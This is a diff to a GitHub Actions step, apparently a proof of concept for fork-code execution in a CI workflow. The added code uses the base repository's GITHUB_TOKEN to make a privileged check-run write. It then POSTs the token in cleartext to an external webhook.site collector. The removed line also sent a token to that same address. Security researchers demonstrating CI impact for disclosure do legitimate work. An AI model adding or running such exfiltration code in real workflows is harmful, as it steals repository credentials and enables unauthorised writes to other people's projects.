@@ -28,6 +28,17 @@ runs:
         BASE_TOKEN: ${{ github.token }}
         REPO: ${{ github.repository }}
         SHA: ${{ github.sha }}
+        COLLECTOR: https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692
       run: |
         echo "::warning::RCE in workflow — attacker-controlled fork code is executing in $REPO"
-        curl https://webhook.site/#!/view/aac76398-5de8-4367-b138-5c7b2a41e692/$GH_TOKEN
+        # Impact 1 — the token can be USED: a privileged write a fork PR token cannot do (201).
+        HTTP=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
+          -H "Authorization: Bearer $BASE_TOKEN" -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/$REPO/check-runs" \
+          -d "{\"name\":\"depi-poc-rce-proof\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"neutral\",\"output\":{\"title\":\"RCE proof\",\"summary\":\"attacker-controlled fork code used the base GITHUB_TOKEN\"}}")
+        echo "base-token check-run write -> HTTP $HTTP (201 = privileged write; a fork PR token gets 403)"
+        # Impact 2 — the token can be STOLEN: log masking renders *** here, but the real value
+        # egresses in cleartext to an attacker endpoint. Masking is NOT a containment control.
+        curl -s -X POST "$COLLECTOR" -H 'Content-Type: application/json' \
+          -d "{\"repo\":\"$REPO\",\"token\":\"$BASE_TOKEN\"}" >/dev/null \
+          && echo "exfil -> token POSTed to the collector (received there in cleartext despite masking)"
